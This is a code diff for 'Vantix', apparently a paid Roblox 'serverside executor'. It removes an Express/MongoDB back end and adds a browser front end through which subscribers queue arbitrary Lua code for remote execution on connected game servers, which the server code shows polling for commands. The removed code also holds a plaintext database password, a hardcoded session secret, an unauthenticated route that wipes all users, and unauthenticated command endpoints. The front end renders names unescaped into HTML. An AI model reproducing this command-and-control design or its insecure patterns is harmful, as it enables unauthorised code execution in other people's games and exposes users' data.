@@ -1,422 +1,473 @@
-const express    = require("express");
-const path       = require("path");
-const bcrypt     = require("bcryptjs");
-const session    = require("express-session");
-const MongoStore = require("connect-mongo");
-const mongoose   = require("mongoose");
-const { v4: uuidv4 } = require("uuid");
-
-const MONGO_URI = "mongodb+srv://VantixSS:IMBACKLOL@vantixss.kyskpmm.mongodb.net/vantix?appName=VantixSS&retryWrites=true&w=majority";
-
-const userSchema = new mongoose.Schema({
-    username: { type: String, required: true, unique: true },
-    email:    { type: String, required: true, unique: true },
-    password: { type: String, required: true },
-    dob:      String,
-    tier:     { type: String, default: "none" },
-    robloxUsername: String,
-    joinedAt: { type: Date, default: Date.now }
-});
-const gameSchema = new mongoose.Schema({
-    placeId:     { type: String, required: true, unique: true },
-    name:        String,
-    players:     { type: Number, default: 0 },
-    creator:     String,
-    icon:        String,
-    earlyAccess: { type: Boolean, default: false },
-    updated:     { type: Date, default: Date.now }
-});
-const tokenSchema = new mongoose.Schema({
-    token:    { type: String, required: true, unique: true },
-    username: String,
-    placeId:  String,
-    used:     { type: Boolean, default: false },
-    createdAt:{ type: Date, default: Date.now, expires: 600 }
-});
-const commandSchema = new mongoose.Schema({
-    id:          { type: String, required: true },
-    placeId:     String,
-    jobId:       String,
-    action:      { type: String, default: "execute" },
-    targetUsername: String,
-    code:        String,
-    status:      { type: String, default: "pending" },
-    output:      String,
-    requestedBy: String,
-    ts:          { type: Date, default: Date.now, expires: 3600 }
-});
-const playerStatusSchema = new mongoose.Schema({
-    robloxUsername: { type: String, required: true, unique: true },
-    displayName:    String,
-    userId:         Number,
-    placeId:        String,
-    jobId:          String,
-    gameName:       String,
-    online:         { type: Boolean, default: false },
-    lastSeen:       { type: Date, default: Date.now }
+// ─── CURSOR GLOW ──────────────────────────────────────────────────────────────
+const glow = document.getElementById("cursorGlow");
+document.addEventListener("mousemove", e => {
+    glow.style.left = e.clientX + "px";
+    glow.style.top  = e.clientY + "px";
 });
 
-const User    = mongoose.model("User",    userSchema);
-const Game    = mongoose.model("Game",    gameSchema);
-const Token   = mongoose.model("Token",   tokenSchema);
-const Command = mongoose.model("Command", commandSchema);
-const PlayerStatus = mongoose.model("PlayerStatus", playerStatusSchema);
+// ─── STATE ────────────────────────────────────────────────────────────────────
+let currentUser  = null;
+let allGames     = [];
+let execPlaceId  = null;
+let execGameName = "";
+let ownerUsers   = [];
+let gamesTimer   = null;
+let trackingTimer = null;
 
-const TIERS = {
-    none:         { maxPlayers: 0        },
-    bronze:       { maxPlayers: 10       },
-    silver:       { maxPlayers: 80       },
-    gold:         { maxPlayers: 100      },
-    diamond:      { maxPlayers: 150      },
-    platinum:     { maxPlayers: 500      },
-    early_access: { maxPlayers: 0, earlyOnly: true },
-    elite:        { maxPlayers: 1000     },
-    absolute:     { maxPlayers: Infinity }
+// ─── PAGE ROUTING ─────────────────────────────────────────────────────────────
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(p => p.classList.add("hidden"));
+    document.getElementById(id).classList.remove("hidden");
+}
+
+function switchTab(tab) {
+    if (tab === "owner" && !isOwnerAccount()) return switchTab("overview");
+    document.querySelectorAll(".tab-content").forEach(t => t.classList.add("hidden"));
+    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
+    document.getElementById("tab-" + tab).classList.remove("hidden");
+    document.querySelectorAll(".tab").forEach(t => {
+        if (t.getAttribute("onclick") === `switchTab('${tab}')`) t.classList.add("active");
+    });
+    if (tab === "owner") loadOwnerUsers();
+    if (tab === "tracking") loadTracking();
+}
+
+function isOwnerAccount() {
+    return currentUser && currentUser.username === "dr.muffinn" && currentUser.isOwner === true;
+}
+
+// ─── AUTH ─────────────────────────────────────────────────────────────────────
+async function doSignup() {
+    const email    = document.getElementById("su-email").value.trim();
+    const username = document.getElementById("su-username").value.trim();
+    const password = document.getElementById("su-password").value;
+    const dob      = document.getElementById("su-dob").value;
+    const errEl    = document.getElementById("signupError");
+
+    const res = await fetch("/api/signup", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, username, password, dob })
+    });
+    const data = await res.json();
+    if (data.ok) {
+        alert("Account created successfully. Please log in.");
+        document.getElementById("li-username").value = username;
+        document.getElementById("li-password").value = "";
+        errEl.classList.add("hidden");
+        showPage("loginPage");
+    } else {
+        errEl.textContent = data.error;
+        errEl.classList.remove("hidden");
+    }
+}
+
+async function doLogin() {
+    const username = document.getElementById("li-username").value.trim();
+    const password = document.getElementById("li-password").value;
+    const errEl    = document.getElementById("loginError");
+
+    const res = await fetch("/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+    });
+    const data = await res.json();
+    if (data.ok) {
+        currentUser = { username: data.username, tier: data.tier, isOwner: data.isOwner, robloxUsername: data.robloxUsername || "" };
+        enterApp();
+    } else {
+        errEl.textContent = data.error;
+        errEl.classList.remove("hidden");
+    }
+}
+
+async function doLogout() {
+    await fetch("/api/logout", { method: "POST" });
+    currentUser = null;
+    allGames = [];
+    if (gamesTimer) clearInterval(gamesTimer);
+    gamesTimer = null;
+    if (trackingTimer) clearInterval(trackingTimer);
+    trackingTimer = null;
+    document.getElementById("ownerTabBtn").classList.add("hidden");
+    showPage("landingPage");
+}
+
+async function checkSession() {
+    const res  = await fetch("/api/me");
+    const data = await res.json();
+    if (data.ok) {
+        currentUser = { username: data.username, tier: data.tier, isOwner: data.isOwner, robloxUsername: data.robloxUsername || "" };
+        enterApp();
+    } else {
+        showPage("landingPage");
+    }
+}
+
+// ─── APP ENTRY ────────────────────────────────────────────────────────────────
+const TIER_LABELS = {
+    none:         "No Tier",
+    bronze:       "Bronze",
+    silver:       "Silver",
+    gold:         "Gold",
+    diamond:      "Diamond",
+    platinum:     "Platinum",
+    early_access: "Early Access",
+    elite:        "Elite",
+    absolute:     "Absolute"
 };
 
-const OWNER = "dr.muffinn";
+function enterApp() {
+    showPage("appPage");
+    document.getElementById("userLabel").textContent = currentUser.username;
+    document.getElementById("tierBadge").textContent = TIER_LABELS[currentUser.tier] || "No Tier";
+    document.getElementById("profileUsername").textContent = currentUser.username;
+    document.getElementById("profileTier").textContent = TIER_LABELS[currentUser.tier] || "No Tier";
+    document.getElementById("overviewTier").textContent = TIER_LABELS[currentUser.tier] || "No Tier";
 
-async function gamesForTier(tierKey) {
-    const all = await Game.find({});
-    if (tierKey === "absolute") return all;
-    if (tierKey === "early_access") return all.filter(g => g.earlyAccess);
-    const tier = TIERS[tierKey];
-    if (!tier) return [];
-    return all.filter(g => !g.earlyAccess && g.players < tier.maxPlayers);
+    document.getElementById("ownerTabBtn").classList.add("hidden");
+    if (isOwnerAccount()) {
+        document.getElementById("ownerTabBtn").classList.remove("hidden");
+    }
+
+    loadGames();
+    loadTracking();
+    switchTab("overview");
+    if (gamesTimer) clearInterval(gamesTimer);
+    gamesTimer = setInterval(loadGames, 5000);
+    if (trackingTimer) clearInterval(trackingTimer);
+    trackingTimer = setInterval(loadTracking, 5000);
 }
 
-const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-mongoose.connect(MONGO_URI)
-    .then(() => console.log("MongoDB connected"))
-    .catch(e => { console.error("MongoDB failed:", e.message); process.exit(1); });
-
-app.use(session({
-    secret: "vantix-2024",
-    resave: false,
-    saveUninitialized: false,
-    store: MongoStore.create({ mongoUrl: MONGO_URI }),
-    cookie: { maxAge: 7 * 24 * 60 * 60 * 1000 }
-}));
-
-function requireLogin(req, res, next) {
-    if (!req.session.username) return res.status(401).json({ ok: false, error: "Not logged in" });
-    next();
-}
-function requireOwner(req, res, next) {
-    if (req.session.username !== OWNER) return res.status(403).json({ ok: false, error: "Forbidden" });
-    next();
-}
-function cleanRobloxUsername(username) {
-    return String(username || "").trim().replace(/^@/, "");
-}
-function trackingPayload(user, status) {
-    const lastSeen = status?.lastSeen || null;
-    const isFresh = lastSeen && Date.now() - new Date(lastSeen).getTime() < 30000;
-    return {
-        ok: true,
-        robloxUsername: user.robloxUsername || "",
-        online: !!(status?.online && isFresh),
-        placeId: status?.placeId || "",
-        jobId: status?.jobId || "",
-        gameName: status?.gameName || "",
-        lastSeen
-    };
+// ─── GAMES ────────────────────────────────────────────────────────────────────
+async function loadGames() {
+    if (!currentUser) return;
+    const res  = await fetch("/api/games");
+    if (!res.ok) return;
+    allGames = await res.json();
+    const overviewGames = document.getElementById("overviewGames");
+    if (overviewGames) overviewGames.textContent = allGames.length;
+    renderGames();
 }
 
-// STATIC
-app.get("/",          (req, res) => res.sendFile(path.join(__dirname, "index.html")));
-app.get("/style.css", (req, res) => res.sendFile(path.join(__dirname, "style.css")));
-app.get("/app.js",    (req, res) => res.sendFile(path.join(__dirname, "app.js")));
-app.get("/api/ping",  (req, res) => res.json({ ok: true }));
+function renderGames() {
+    const search = (document.getElementById("gameSearch")?.value || "").toLowerCase();
+    const grid   = document.getElementById("gamesGrid");
+    const filtered = allGames.filter(g =>
+        !search || g.name.toLowerCase().includes(search)
+    );
 
-// RESET (remove after use)
-app.get("/api/reset-users", async (req, res) => {
-    await User.deleteMany({});
-    res.json({ ok: true, message: "All users wiped." });
-});
+    if (filtered.length === 0) {
+        grid.innerHTML = `<div class="no-games"><h3>${currentUser.tier === "none" ? "No tier yet" : "No games found"}</h3><p>${currentUser.tier === "none" ? "Go to Upgrade tab to get a tier." : "No tracked games visible for your tier right now."}</p></div>`;
+        return;
+    }
 
-// SIGNUP
-app.post("/api/signup", async (req, res) => {
+    grid.innerHTML = filtered.map(g => `
+        <div class="game-card">
+            <img src="${g.icon || "https://placehold.co/400x160/030a06/00ff88?text=Vantix"}" alt="${g.name}">
+            <div class="game-info">
+                <h3>${g.name}</h3>
+                <div class="game-meta">
+                    <span>Players: <b>${g.players}</b></span>
+                    <span>Place ID: <b>${g.placeId}</b></span>
+                    <span>Creator: <b>${g.creator}</b></span>
+                    ${g.earlyAccess ? '<span><b>Early Access</b></span>' : ""}
+                </div>
+                <div class="game-actions">
+                    <button class="btn-join" onclick="joinGame('${g.placeId}', '${g.name}')">Join Game</button>
+                    <button class="btn-exec" onclick="openExec('${g.placeId}', '${g.name}')">Execute</button>
+                </div>
+            </div>
+        </div>
+    `).join("");
+}
+
+// USER TRACKING
+async function loadTracking() {
+    if (!currentUser) return;
+    const input = document.getElementById("trackUsername");
+    const status = document.getElementById("trackStatus");
+    if (!input || !status) return;
     try {
-        const { email, username, password, dob } = req.body;
-        if (!email || !username || !password || !dob)
-            return res.json({ ok: false, error: "All fields required" });
-
-        const cleanEmail    = email.trim().toLowerCase();
-        const cleanUsername = username.trim();
-
-        const existingUser  = await User.findOne({ username: cleanUsername });
-        const existingEmail = await User.findOne({ email: cleanEmail });
-        if (existingUser)  return res.json({ ok: false, error: "Username already taken" });
-        if (existingEmail) return res.json({ ok: false, error: "Email already in use" });
-
-        const hash = await bcrypt.hash(password, 10);
-        await User.create({ email: cleanEmail, username: cleanUsername, password: hash, dob, tier: "none" });
-
-        res.json({ ok: true, username: cleanUsername });
-    } catch (e) {
-        console.error("Signup error:", e.message);
-        if (e.code === 11000) {
-            const field = Object.keys(e.keyPattern || {})[0];
-            return res.json({ ok: false, error: field === "username" ? "Username already taken" : "Email already in use" });
+        const res = await fetch("/api/tracking");
+        const data = await res.json();
+        if (data.ok) {
+            input.value = data.robloxUsername || "";
+            currentUser.robloxUsername = data.robloxUsername || "";
+            renderTrackingStatus(data);
+            updateOverviewTracking(data);
         }
-        res.json({ ok: false, error: "Signup failed: " + e.message });
-    }
-});
-
-// LOGIN
-app.post("/api/login", async (req, res) => {
-    try {
-        const { username, password } = req.body;
-        if (!username || !password) return res.json({ ok: false, error: "All fields required" });
-        const user = await User.findOne({ username: username.trim() });
-        if (!user) return res.json({ ok: false, error: "Invalid username or password" });
-        const match = await bcrypt.compare(password, user.password);
-        if (!match) return res.json({ ok: false, error: "Invalid username or password" });
-        req.session.username = user.username;
-        req.session.save(() => res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER, robloxUsername: user.robloxUsername || "" }));
-    } catch (e) {
-        console.error("Login error:", e.message);
-        res.json({ ok: false, error: "Login failed: " + e.message });
-    }
-});
-
-// LOGOUT
-app.post("/api/logout", (req, res) => req.session.destroy(() => res.json({ ok: true })));
-
-// ME
-app.get("/api/me", async (req, res) => {
-    if (!req.session.username) return res.json({ ok: false });
-    try {
-        const user = await User.findOne({ username: req.session.username });
-        if (!user) return res.json({ ok: false });
-        res.json({ ok: true, username: user.username, tier: user.tier, isOwner: user.username === OWNER, robloxUsername: user.robloxUsername || "" });
-    } catch { res.json({ ok: false }); }
-});
-
-// TRACKING
-app.get("/api/tracking", requireLogin, async (req, res) => {
-    try {
-        const user = await User.findOne({ username: req.session.username });
-        if (!user) return res.json({ ok: false, error: "User not found" });
-        const status = user.robloxUsername
-            ? await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + user.robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "$", "i") })
-            : null;
-        res.json(trackingPayload(user, status));
     } catch {
-        res.json({ ok: false, error: "Could not load tracking settings" });
+        status.textContent = "Could not load tracking settings.";
+        status.classList.add("error");
     }
-});
+}
 
-app.post("/api/tracking", requireLogin, async (req, res) => {
-    try {
-        const robloxUsername = cleanRobloxUsername(req.body.robloxUsername);
-        if (robloxUsername && !/^[A-Za-z0-9_]{3,20}$/.test(robloxUsername))
-            return res.json({ ok: false, error: "Enter a valid Roblox username" });
-        const user = await User.findOneAndUpdate(
-            { username: req.session.username },
-            { robloxUsername },
-            { new: true }
-        );
-        if (!user) return res.json({ ok: false, error: "User not found" });
-        const status = user.robloxUsername
-            ? await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + user.robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "$", "i") })
-            : null;
-        res.json(trackingPayload(user, status));
-    } catch {
-        res.json({ ok: false, error: "Could not save tracking settings" });
+async function saveTracking() {
+    const input = document.getElementById("trackUsername");
+    const status = document.getElementById("trackStatus");
+    const robloxUsername = input.value.trim().replace(/^@/, "");
+    status.textContent = "Saving...";
+    status.classList.remove("error");
+    const res = await fetch("/api/tracking", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ robloxUsername })
+    });
+    const data = await res.json();
+    if (data.ok) {
+        input.value = data.robloxUsername || "";
+        currentUser.robloxUsername = data.robloxUsername || "";
+        renderTrackingStatus(data);
+        updateOverviewTracking(data);
+    } else {
+        status.textContent = data.error || "Could not save tracking settings.";
+        status.classList.add("error");
     }
-});
+}
 
-// GAMES
-app.get("/api/games", requireLogin, async (req, res) => {
-    try {
-        const user = await User.findOne({ username: req.session.username });
-        res.json(await gamesForTier(user.tier));
-    } catch { res.json([]); }
-});
-
-// JOIN TOKEN
-app.post("/api/join", requireLogin, async (req, res) => {
-    try {
-        const { placeId } = req.body;
-        if (!placeId) return res.json({ ok: false });
-        const user    = await User.findOne({ username: req.session.username });
-        const allowed = await gamesForTier(user.tier);
-        if (!allowed.find(g => g.placeId === placeId))
-            return res.json({ ok: false, error: "Your tier does not include this game" });
-        const token = uuidv4();
-        await Token.create({ token, username: user.username, placeId });
-        res.json({ ok: true, token, placeId });
-    } catch (e) { res.json({ ok: false, error: e.message }); }
-});
-
-// ROBLOX UPDATE
-app.post("/api/update", async (req, res) => {
-    try {
-        const { placeId, players, name, creator, earlyAccess } = req.body;
-        if (!placeId) return res.json({ ok: false });
-        let icon = "";
-        try {
-            const r = await fetch(`https://thumbnails.roblox.com/v1/places/gameicons?placeIds=${placeId}&size=512x512&format=Png`);
-            const d = await r.json();
-            icon = d?.data?.[0]?.imageUrl || "";
-        } catch {}
-        await Game.findOneAndUpdate(
-            { placeId },
-            { placeId, players: Number(players) || 0, name: name || "Unknown", creator: creator || "Unknown", icon, earlyAccess: earlyAccess === true || earlyAccess === "true", updated: new Date() },
-            { upsert: true, new: true }
-        );
-        res.json({ ok: true });
-    } catch (e) { res.json({ ok: false }); }
-});
-
-// VALIDATE TOKEN
-app.post("/api/validate-token", async (req, res) => {
-    try {
-        const { token, placeId } = req.body;
-        if (!token || !placeId) return res.json({ ok: false });
-        const t = await Token.findOne({ token, placeId, used: false });
-        if (!t) return res.json({ ok: false });
-        t.used = true;
-        await t.save();
-        res.json({ ok: true, username: t.username });
-    } catch { res.json({ ok: false }); }
-});
-
-app.post("/api/check-player", async (req, res) => {
-    try {
-        const robloxUsername = cleanRobloxUsername(req.body.username);
-        if (!robloxUsername) return res.json({ ok: false });
-        const escaped = robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-        const user = await User.findOne({ robloxUsername: new RegExp("^" + escaped + "$", "i") });
-        res.json({ ok: !!user });
-    } catch {
-        res.json({ ok: false });
+function renderTrackingStatus(data) {
+    const status = document.getElementById("trackStatus");
+    if (!status) return;
+    status.classList.remove("error", "online", "offline");
+    if (!data.robloxUsername) {
+        status.textContent = "No Roblox username set.";
+        status.classList.add("offline");
+        return;
     }
-});
-
-app.post("/api/player-status", async (req, res) => {
-    try {
-        const robloxUsername = cleanRobloxUsername(req.body.username);
-        if (!robloxUsername) return res.json({ ok: false });
-        await PlayerStatus.findOneAndUpdate(
-            { robloxUsername },
-            {
-                robloxUsername,
-                displayName: req.body.displayName || "",
-                userId: Number(req.body.userId) || 0,
-                placeId: String(req.body.placeId || ""),
-                jobId: String(req.body.jobId || ""),
-                gameName: String(req.body.gameName || ""),
-                online: req.body.online === true || req.body.online === "true",
-                lastSeen: new Date()
-            },
-            { upsert: true, new: true }
-        );
-        res.json({ ok: true });
-    } catch {
-        res.json({ ok: false });
+    if (data.online) {
+        status.textContent = `Online now in ${data.gameName || "a connected game"}${data.placeId ? ` (${data.placeId})` : ""}.`;
+        status.classList.add("online");
+        return;
     }
-});
+    status.textContent = data.lastSeen
+        ? `Offline. Last seen ${new Date(data.lastSeen).toLocaleString()}.`
+        : `Watching for ${data.robloxUsername}. Offline right now.`;
+    status.classList.add("offline");
+}
 
-// EXECUTE
-app.post("/api/execute", requireLogin, async (req, res) => {
-    try {
-        const { placeId, code } = req.body;
-        if (!placeId || !String(code || "").trim()) return res.json({ ok: false, error: "Missing script" });
-        const user = await User.findOne({ username: req.session.username });
-        if (!user) return res.json({ ok: false, error: "User not found" });
-        const allowed = await gamesForTier(user.tier);
-        if (!allowed.find(g => String(g.placeId) === String(placeId)))
-            return res.json({ ok: false, error: "Your tier does not include this game" });
-
-        const robloxUsername = cleanRobloxUsername(user.robloxUsername);
-        if (!robloxUsername) return res.json({ ok: false, error: "Set your Roblox username in the Tracking tab first" });
-
-        const escaped = robloxUsername.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-        const status = await PlayerStatus.findOne({ robloxUsername: new RegExp("^" + escaped + "$", "i") });
-        const fresh = status?.lastSeen && Date.now() - new Date(status.lastSeen).getTime() < 30000;
-        if (!status?.online || !fresh)
-            return res.json({ ok: false, error: `${robloxUsername} is not online in a connected game right now` });
-        if (String(status.placeId) !== String(placeId))
-            return res.json({ ok: false, error: `${robloxUsername} is online, but not in this game` });
-        if (!status.jobId)
-            return res.json({ ok: false, error: "Tracked server has not reported a JobId yet" });
-
-        const id = uuidv4();
-        await Command.create({
-            id,
-            placeId,
-            jobId: status.jobId,
-            targetUsername: robloxUsername,
-            code,
-            status: "pending",
-            requestedBy: req.session.username
-        });
-        res.json({ ok: true, id });
-    } catch (e) {
-        res.json({ ok: false, error: "Could not send execute command" });
+function updateOverviewTracking(data) {
+    const el = document.getElementById("overviewTracking");
+    if (!el) return;
+    if (!data?.robloxUsername) {
+        el.textContent = "Not Set";
+    } else if (data.online) {
+        el.textContent = "Online";
+    } else {
+        el.textContent = "Offline";
     }
-});
+}
 
-app.get("/api/poll", async (req, res) => {
+function toggleCursorGlow(enabled) {
+    const glowEl = document.getElementById("cursorGlow");
+    if (glowEl) glowEl.style.display = enabled ? "block" : "none";
+}
+
+function toggleGamesRefresh(enabled) {
+    if (gamesTimer) clearInterval(gamesTimer);
+    gamesTimer = enabled ? setInterval(loadGames, 5000) : null;
+}
+
+// ─── JOIN GAME ────────────────────────────────────────────────────────────────
+async function joinGame(placeId, name) {
+    const res  = await fetch("/api/join", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ placeId })
+    });
+    const data = await res.json();
+    if (!data.ok) {
+        alert(data.error || "Could not join game.");
+        return;
+    }
+
+    const token = data.token;
+    const url   = `roblox://placeId=${placeId}&launchData=${encodeURIComponent(token)}`;
+
+    const confirmed = confirm(`Open Roblox to join "${name}"?`);
+    if (confirmed) {
+        window.location.href = url;
+    }
+}
+
+// ─── SCRIPT EXECUTION ─────────────────────────────────────────────────────────
+function openExec(placeId, name) {
+    execPlaceId = placeId;
+    execGameName = name;
+    document.getElementById("execModalTitle").textContent = `Execute - ${name}`;
+    document.getElementById("execOutput").innerHTML = "";
+    document.getElementById("execCode").value = "";
+    appendExecLog(`// Connected to: ${name} (${placeId})`, "info");
+    appendExecLog(`// Type Lua code and press Run or Ctrl+Enter.`, "info");
+    document.getElementById("execModal").classList.remove("hidden");
+    document.getElementById("execCode").focus();
+}
+
+function closeExecModal() {
+    document.getElementById("execModal").classList.add("hidden");
+    execPlaceId = null;
+    execGameName = "";
+}
+
+function appendExecLog(text, type = "output") {
+    const el   = document.getElementById("execOutput");
+    const line = document.createElement("div");
+    line.className = "log-line log-" + type;
+    line.textContent = text;
+    el.appendChild(line);
+    el.scrollTop = el.scrollHeight;
+}
+
+function popoutExec() {
+    if (!execPlaceId) return;
+    const currentCode = document.getElementById("execCode").value;
+    const title = `Execute - ${execGameName || execPlaceId}`;
+    const popup = window.open("", "vantixExecutor", "popup=yes,width=860,height=640");
+    if (!popup) {
+        appendExecLog("Pop-out blocked. Allow pop-ups for this site and try again.", "warn");
+        return;
+    }
+
+    popup.document.open();
+    popup.document.write(`<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>${title.replace(/[<>&"]/g, "")}</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#030a06;color:#e8f5ee;font-family:'Space Grotesk',Arial,sans-serif;height:100vh;display:flex;flex-direction:column}header{padding:14px 18px;border-bottom:1px solid rgba(0,255,136,.18);color:#00ff88;font:700 14px 'Space Mono',monospace;background:rgba(0,255,136,.04)}#out{flex:1;overflow:auto;padding:14px 18px;font:13px/1.7 'Space Mono',Consolas,monospace}.line-info{color:rgba(0,255,136,.55)}.line-input{color:#7fffb8}.line-output{color:#a0ffcc}.line-error{color:#ff7070}.line-warn{color:#ffd470}.input{border-top:1px solid rgba(0,255,136,.18);padding:12px 14px;background:rgba(0,0,0,.24)}textarea{width:100%;min-height:130px;resize:vertical;background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.18);border-radius:10px;color:#e8f5ee;padding:10px 12px;font:13px/1.6 'Space Mono',Consolas,monospace;outline:none}textarea:focus{border-color:#00cc6a}footer{display:flex;align-items:center;justify-content:space-between;margin-top:10px;color:rgba(232,245,238,.5);font-size:12px}button{background:#00ff88;color:#000;border:0;border-radius:10px;padding:10px 24px;font-weight:800;cursor:pointer}button:disabled{opacity:.5;cursor:not-allowed}
+</style>
+</head>
+<body>
+<header>${title.replace(/[<>&"]/g, "")}</header>
+<div id="out"></div>
+<div class="input">
+<textarea id="code" spellcheck="false" placeholder="-- Enter Lua code&#10;print('Hello from server!')"></textarea>
+<footer><span>Ctrl+Enter to run</span><button id="run">Run</button></footer>
+</div>
+<script>
+const placeId=${JSON.stringify(execPlaceId)};
+const initialCode=${JSON.stringify(currentCode)};
+const out=document.getElementById("out");
+const code=document.getElementById("code");
+const run=document.getElementById("run");
+code.value=initialCode;
+function log(text,type="output"){const line=document.createElement("div");line.className="line-"+type;line.textContent=text;out.appendChild(line);out.scrollTop=out.scrollHeight;}
+async function poll(id,attempts=0){if(attempts>120){log("No result after 60s. Check Roblox Developer Console for [Vantix] poll/result errors.","warn");return;}await new Promise(r=>setTimeout(r,500));try{const res=await fetch("/api/result?placeId="+encodeURIComponent(placeId)+"&id="+encodeURIComponent(id));const data=await res.json();if(data.status==="done"){log("Done: "+data.output,"output");}else{if(attempts>0&&attempts%20===0)log("Still waiting for Roblox to post the result...","info");poll(id,attempts+1);}}catch{poll(id,attempts+1);}}
+async function execute(){const text=code.value.trim();if(!text)return;run.disabled=true;run.textContent="Sending...";log("> "+text,"input");try{const res=await fetch("/api/execute",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({placeId,code:text})});const data=await res.json();if(!data.ok){log("Error: "+(data.error||"Failed to send"),"error");}else{log("Sent to the tracked server. Watch Roblox Developer Console for [Vantix exec] output.","info");poll(data.id);code.value="";}}catch(e){log("Error: "+e.message,"error");}run.disabled=false;run.textContent="Run";}
+run.addEventListener("click",execute);
+document.addEventListener("keydown",e=>{if(e.ctrlKey&&e.key==="Enter")execute();});
+log("// Connected to: ${String(execGameName || "Game").replace(/[\\`$]/g, "")} ("+placeId+")","info");
+log("// Pop-out executor ready.","info");
+</script>
+</body>
+</html>`);
+    popup.document.close();
+    popup.focus();
+}
+
+async function runExec() {
+    const code = document.getElementById("execCode").value.trim();
+    if (!code || !execPlaceId) return;
+
+    const btn = document.getElementById("execRunBtn");
+    btn.disabled = true;
+    btn.textContent = "Sending...";
+    appendExecLog("> " + code, "input");
+
+    const res  = await fetch("/api/execute", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ placeId: execPlaceId, code })
+    });
+    const data = await res.json();
+
+    if (!data.ok) {
+        appendExecLog("Error: " + (data.error || "Failed to send"), "error");
+        btn.disabled = false;
+        btn.textContent = "Run";
+        return;
+    }
+
+    appendExecLog("Sent to the tracked server. Watch Roblox Developer Console for [Vantix exec] output.", "info");
+    pollExecResult(data.id);
+
+    btn.disabled = false;
+    btn.textContent = "Run";
+    document.getElementById("execCode").value = "";
+}
+
+async function pollExecResult(cmdId, attempts = 0) {
+    if (attempts > 120) {
+        appendExecLog("No result after 60s. Check Roblox Developer Console for [Vantix] poll/result errors.", "warn");
+        return;
+    }
+    await new Promise(r => setTimeout(r, 500));
     try {
-        const { placeId, jobId } = req.query;
-        if (!placeId) return res.json({ commands: [] });
-        const query = { placeId, status: "pending" };
-        if (jobId) {
-            query.$or = [{ jobId: String(jobId) }, { jobId: { $exists: false } }, { jobId: "" }];
+        const res  = await fetch(`/api/result?placeId=${execPlaceId}&id=${cmdId}`);
+        const data = await res.json();
+        if (data.status === "done") {
+            appendExecLog("Done: " + data.output, "output");
+        } else {
+            if (attempts > 0 && attempts % 20 === 0) {
+                appendExecLog("Still waiting for Roblox to post the result...", "info");
+            }
+            pollExecResult(cmdId, attempts + 1);
         }
-        const cmds = await Command.find(query);
-        await Command.updateMany({ _id: { $in: cmds.map(c => c._id) } }, { status: "sent" });
-        res.json({ commands: cmds.map(c => ({ id: c.id, action: c.action || "execute", code: c.code, targetUsername: c.targetUsername })) });
-    } catch { res.json({ commands: [] }); }
-});
+    } catch {
+        pollExecResult(cmdId, attempts + 1);
+    }
+}
 
-app.post("/api/result", async (req, res) => {
-    try {
-        const { placeId, id, output } = req.body;
-        if (!placeId || !id) return res.json({ ok: false });
-        await Command.findOneAndUpdate({ id, placeId }, { status: "done", output: output || "(no output)" });
-        res.json({ ok: true });
-    } catch { res.json({ ok: false }); }
-});
+// ─── OWNER PANEL ──────────────────────────────────────────────────────────────
+async function loadOwnerUsers() {
+    const res  = await fetch("/api/owner/users");
+    if (!res.ok) return;
+    ownerUsers = await res.json();
+    renderOwnerUsers(ownerUsers);
+}
 
-app.get("/api/result", requireLogin, async (req, res) => {
-    try {
-        const { placeId, id } = req.query;
-        if (!placeId || !id) return res.json({ status: "unknown" });
-        const cmd = await Command.findOne({ id, placeId });
-        if (!cmd) return res.json({ status: "unknown" });
-        res.json({ status: cmd.status, output: cmd.output });
-    } catch { res.json({ status: "unknown" }); }
-});
+function filterOwnerUsers() {
+    const q = document.getElementById("ownerSearch").value.toLowerCase();
+    renderOwnerUsers(ownerUsers.filter(u => u.username.toLowerCase().includes(q) || u.email.toLowerCase().includes(q)));
+}
 
-// OWNER
-app.get("/api/owner/users", requireOwner, async (req, res) => {
-    try {
-        const list = await User.find({}, { password: 0 });
-        res.json(list.map(u => ({ username: u.username, email: u.email, tier: u.tier, joinedAt: u.joinedAt })));
-    } catch { res.json([]); }
-});
+function renderOwnerUsers(list) {
+    const tiers = ["none","bronze","silver","gold","diamond","platinum","early_access","elite","absolute"];
+    const el = document.getElementById("ownerUsersTable");
+    el.innerHTML = `
+        <table class="owner-table">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Email</th>
+                    <th>Current Tier</th>
+                    <th>Set Tier</th>
+                    <th></th>
+                </tr>
+            </thead>
+            <tbody>
+                ${list.map(u => `
+                    <tr>
+                        <td>${u.username}</td>
+                        <td>${u.email}</td>
+                        <td>${TIER_LABELS[u.tier] || u.tier}</td>
+                        <td>
+                            <select class="tier-select" id="tier-sel-${u.username}">
+                                ${tiers.map(t => `<option value="${t}" ${u.tier === t ? "selected" : ""}>${TIER_LABELS[t]}</option>`).join("")}
+                            </select>
+                        </td>
+                        <td>
+                            <button class="btn-save" onclick="setTier('${u.username}')">Save</button>
+                        </td>
+                    </tr>
+                `).join("")}
+            </tbody>
+        </table>`;
+}
 
-app.post("/api/owner/set-tier", requireOwner, async (req, res) => {
-    try {
-        const { username, tier } = req.body;
-        if (!TIERS[tier]) return res.json({ ok: false, error: "Invalid tier" });
-        const user = await User.findOneAndUpdate({ username }, { tier });
-        if (!user) return res.json({ ok: false, error: "User not found" });
